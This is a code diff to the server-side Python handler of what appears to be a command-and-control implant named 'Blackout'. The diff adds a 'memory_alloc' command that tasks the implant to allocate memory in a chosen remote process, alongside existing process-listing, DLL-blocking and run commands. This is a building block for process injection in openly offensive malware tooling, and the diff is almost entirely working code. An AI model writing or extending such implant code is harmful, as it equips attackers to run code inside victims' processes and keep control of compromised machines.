@@ -27,6 +27,14 @@ COMMAND_BLOCKDLLS        = 0x141
 COMMAND_EXITP            = 0x160
 COMMAND_EXITT            = 0x161
 COMMAND_PROCLIST         = 0x157
+
+COMMAND_MEMORY           = 0x300
+MEMORY_ALLOC    = 0x301
+MEMORY_ALLOC    = 0x301
+MEMORY_WRITE    = 0x302
+MEMORY_PROTECT  = 0x303
+MEMORY_QUERY    = 0x304
+
 COMMAND_OUTPUT           = 0x200
 
 # ====================
@@ -47,6 +55,49 @@ class CommandCheckin( Command ):
         Task.add_int( self.CommandId )
 
         return Task.buffer
+    
+class CommandMemoryAlloc( Command ):
+    CommandId   = COMMAND_MEMORY
+    Name        = "memory_alloc"
+    Description = "alloc private memory in the target process"
+    Help        = ""
+    NeedAdmin   = False
+    Params = [
+        CommandParam(
+            name="process_id",
+            is_file_path=False,
+            is_optional=False
+        ),
+        CommandParam(
+            name="base_address",
+            is_file_path=False,
+            is_optional=False
+        ),
+        CommandParam(
+            name="region_size",
+            is_file_path=False,
+            is_optional=False
+        ),
+        CommandParam(
+            name="protection",
+            is_file_path=False,
+            is_optional=False
+        )
+    ]
+    Mitr = []
+
+    def job_generate( self, arguments:dict ) -> bytes:
+        Task = Packer()
+
+        Task.add_int(   self.CommandId )
+        Task.add_int(   int( MEMORY_ALLOC ) )
+        Task.add_int(   int( arguments[ 'process_id'  ] ) )
+        Task.add_int(   int( arguments[ 'base_address' ] ) )
+        Task.add_int64( int( arguments[ 'region_size'  ] ) )
+        Task.add_int(   int( arguments[ 'protection'   ] ) )
+
+        return Task.buffer
+
 
 class CommandRun( Command ):
     CommandId   = COMMAND_RUN
@@ -197,6 +248,7 @@ class Blackout(AgentType):
 
     Commands = [
         CommandCheckin(),
+        CommandMemoryAlloc(),
         CommandRun(),
         CommandCd,
         CommandPwd(),
@@ -388,6 +440,11 @@ class Blackout(AgentType):
                 )
 
                 self.console_message( AgentID, "Good", f"Received informations from agent:\n", Output )
+
+            elif Command == COMMAND_MEMORY:
+                base_addr = response_parser.parser_int64()
+
+                self.console_message( AgentID, "Good", f"Memory allocated with success at 0x{base_addr:X}", "" )
 
             elif Command == COMMAND_RUN:
                 bCheck = response_parser.parse_int()
